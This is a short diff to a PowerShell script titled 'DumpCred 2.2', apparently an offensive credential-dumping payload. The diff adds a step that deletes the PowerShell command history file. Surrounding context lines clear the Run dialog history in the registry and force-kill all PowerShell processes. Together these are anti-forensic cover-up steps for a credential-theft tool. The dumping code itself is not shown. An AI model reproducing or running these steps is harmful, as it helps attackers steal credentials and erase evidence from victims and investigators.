@@ -1,4 +1,4 @@
-﻿
+
 <#
 .SYNOPSIS
    DumpCred 2.2
@@ -143,6 +143,9 @@ $OUT = $out.Replace([char][int]10, "`n")
 
 #  Epmty Run Input Field
 Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentContinue
+
+# Clear Powershell History
+rm $env:Appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 
 # Kill all Powershell Tasks
 taskkill /F /IM powershell.exe
